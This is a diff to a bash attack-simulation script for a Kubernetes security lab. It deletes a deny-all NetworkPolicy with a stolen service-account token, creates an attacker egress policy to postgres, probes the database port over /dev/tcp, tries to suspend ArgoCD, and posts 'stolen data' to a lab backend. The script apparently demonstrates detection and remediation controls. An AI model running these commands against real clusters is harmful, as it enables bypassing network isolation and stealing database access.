@@ -59,15 +59,13 @@ NP_COUNT=$(kubectl get networkpolicy \
 # PHASE 2 — EXPLOITATION (delete deny-all, open the path, use the credentials)
 # =============================================================================
 
-# ── Step 4: Strip the namespace egress isolation ──────────────────────────────
-# Deleting deny-all alone is NOT enough — target-app stays egress-isolated by
-# allow-dns + allow-target-egress-* (so it can only reach DNS/backend/k8s-api,
-# and postgres stays blocked). To actually open the database path the attacker
-# removes every egress policy that isolates target-app. ArgoCD (secops-lab, never
-# suspended) restores them all in ~30s, re-sealing the path.
+# ── Step 4: Delete deny-all (Kyverno guard check) ─────────────────────────────
+# Control gate: in With-Controls mode protect-networkpolicies blocks this delete
+# and the attack stops here. In Allow Attack the guard is down, so it succeeds
+# and the attacker proceeds to open a path to the database.
 emit "ATTACK" "CRITICAL" \
   "Deleting NetworkPolicy: deny-all" \
-  "Removing the namespace default-deny policy — first step in stripping the traffic isolation that keeps the database unreachable."
+  "Removing the namespace default-deny policy. With the Kyverno guard down (Allow Attack), the delete succeeds."
 
 DELETE_RESULT=$(kubectl delete networkpolicy deny-all \
   --token="$TOKEN" \
@@ -79,34 +77,57 @@ DELETE_RESULT=$(kubectl delete networkpolicy deny-all \
 if echo "$DELETE_RESULT" | grep -q "BLOCKED\|denied\|forbidden"; then
   emit "DETECT" "SUCCESS" \
     "Kyverno: NetworkPolicy deletion blocked" \
-    "Kyverno policy protect-networkpolicies denied the delete request at admission. NetworkPolicy intact. Database path never opened — window: 0 seconds."
+    "Kyverno policy protect-networkpolicies denied the delete request at admission. Isolation intact, database never exposed — window: 0 seconds."
   exit 0
 fi
 
-# Remove the remaining egress policies that still isolate target-app. Without
-# this, target-app's egress stays limited to DNS/backend/k8s-api and postgres is
-# unreachable even with deny-all gone.
-for np in allow-dns allow-target-egress-to-backend allow-target-egress-to-k8s-api; do
-  kubectl delete networkpolicy "$np" \
-    --token="$TOKEN" \
-    --server="$APISERVER" \
-    --certificate-authority="$CA" \
-    -n "$NAMESPACE" \
-    --ignore-not-found=true 2>/dev/null || true
-done
-
+# ── Step 5: Grant target-app a direct egress path to the database ─────────────
+# Stripping target-app's OWN egress isolation would also sever its DNS/backend
+# connectivity (the agent could no longer operate). Instead the attacker ADDS an
+# egress allow to postgres — the workload keeps all its existing access and gains
+# a path to the DB. network-tooling-sa can create NetworkPolicies, and Kyverno
+# protect-networkpolicies only guards deletion (not creation). Automated
+# remediation removes this policy afterwards to close the window.
 emit "ATTACK" "CRITICAL" \
-  "Egress isolation stripped — workload can now reach the database" \
-  "deny-all plus the target-app egress policies (allow-dns, allow-target-egress-*) are gone. target-app is no longer egress-isolated and can open a direct connection to postgres. ArgoCD (secops-lab) will restore all of them in ~30s — re-sealing the path. The window is open."
+  "Creating egress policy: target-app → postgres" \
+  "The attacker grants target-app a direct egress path to the database. Combined with the existing allow-target-to-postgres ingress rule, postgres is now reachable from the compromised workload."
 
-# ── Step 5: Probe postgres ────────────────────────────────────────────────────
+kubectl apply \
+  --token="$TOKEN" \
+  --server="$APISERVER" \
+  --certificate-authority="$CA" \
+  -f - <<'EOF' 2>/dev/null || true
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: attacker-postgres-exfil
+  namespace: secops-lab
+spec:
+  podSelector:
+    matchLabels:
+      app: target-app
+  policyTypes:
+    - Egress
+  egress:
+    - to:
+        - podSelector:
+            matchLabels:
+              app: postgres
+      ports:
+        - port: 5432
+EOF
+
+# Give the CNI a moment to program the new egress rule before probing.
+sleep 2
+
+# ── Step 6: Probe postgres ────────────────────────────────────────────────────
 POSTGRES_RESULT=$(bash -c 'echo > /dev/tcp/postgres/5432' 2>/dev/null && echo "OPEN" || echo "blocked")
 
 emit "IMPACT" "CRITICAL" \
   "postgres:5432 → $POSTGRES_RESULT" \
-  "TCP probe to the database after stripping egress isolation. Network path confirmed $POSTGRES_RESULT."
+  "TCP probe to the database after the attacker added the egress path. Network path confirmed $POSTGRES_RESULT."
 
-# ── Step 6: Try to suspend ArgoCD (will fail) ─────────────────────────────────
+# ── Step 7: Try to suspend ArgoCD (will fail) ─────────────────────────────────
 kubectl patch application secops-lab \
   --token="$TOKEN" \
   --server="$APISERVER" \
@@ -116,31 +137,29 @@ kubectl patch application secops-lab \
   -p '{"spec":{"syncPolicy":{"automated":null}}}' \
   2>&1 || emit "DETECT" "WARNING" \
     "ArgoCD suspend failed — SA has no rights to argocd namespace" \
-    "network-tooling-sa is scoped to secops-lab only. ArgoCD cannot be touched, so GitOps stays in control. deny-all will reconcile back in ~30 seconds — closing the attacker's path. The breach does not persist."
+    "network-tooling-sa is scoped to secops-lab only. The attacker cannot disable GitOps, so ArgoCD stays in control and will revert the deny-all deletion. Automated remediation also removes the attacker's egress policy — so the breach does not persist."
 
-# ── Step 7: Record window start ───────────────────────────────────────────────
+# ── Step 8: Record window start ───────────────────────────────────────────────
 WINDOW_START=$(date +%s)
 curl -sf -X POST "$BACKEND_URL/internal/window-start" \
   -H "Content-Type: application/json" \
   -d "{\"scenario\":\"network-policy-bypass\",\"started_at\":$WINDOW_START}" \
   || true
 
-# ── Step 8: Emit final IMPACT ─────────────────────────────────────────────────
+# ── Step 9: Emit final IMPACT ─────────────────────────────────────────────────
 emit "IMPACT" "CRITICAL" \
   "postgres=$POSTGRES_RESULT — with credentials stolen pre-attack, attacker can now run: psql -h ${DB_HOST:-postgres} -U ${DB_USER:-app} -d ${DB_NAME:-appdb}" \
-  "Credentials were harvested before the network was opened (Phase 1). With deny-all deleted, those credentials now have a live path to the database. The attacker cannot suspend ArgoCD (SA is namespace-scoped), so GitOps restores deny-all within ~30s — closing this path. The breach is bounded by reconciliation time, with no persistence."
+  "Credentials were harvested in Phase 1; the attacker-created egress policy now gives them a live path to the database. The attacker cannot disable GitOps, so automated remediation removes that policy and ArgoCD restores deny-all + protect-networkpolicies — closing the path. The breach is bounded by detection + remediation time."
 
-# ── Step 9: Send stolen data to backend ───────────────────────────────────────
+# ── Step 10: Send stolen data to backend ──────────────────────────────────────
 STOLEN=$(jq -n \
-  --arg creds "host=${DB_HOST:-postgres} user=${DB_USER:-app} database=${DB_NAME:-appdb} password=${DB_PASSWORD:0:2}***" \
-  --arg np_map "$NP_LIST ($NP_COUNT policies)" \
   --arg postgres "postgres:5432 → $POSTGRES_RESULT" \
-  --arg window "deny-all deleted — path open only until ArgoCD reconciles (~30s), no backdoor planted" \
-  '{credentials: $creds, network_map: $np_map, postgres_probe: $postgres, exposure_window: $window}')
+  --arg action "Created NetworkPolicy 'attacker-postgres-exfil' granting target-app egress to postgres:5432 — database access opened, and stays open until automated remediation removes the policy." \
+  '{postgres_access: $postgres, attacker_action: $action}')
 
 curl -sf -X POST "$BACKEND_URL/internal/stolen-data" \
   -H "Content-Type: application/json" \
   -d "{\"scenario\":\"network-policy-bypass\",\"data\":$(echo "$STOLEN" | jq -Rs .)}" \
   || true
 
-echo "Attack complete — window open, ArgoCD reconciles deny-all in ~30s and the path closes (no backdoor)"
+echo "Attack complete — DB path open via attacker egress policy; awaiting SOC remediation to close the window"
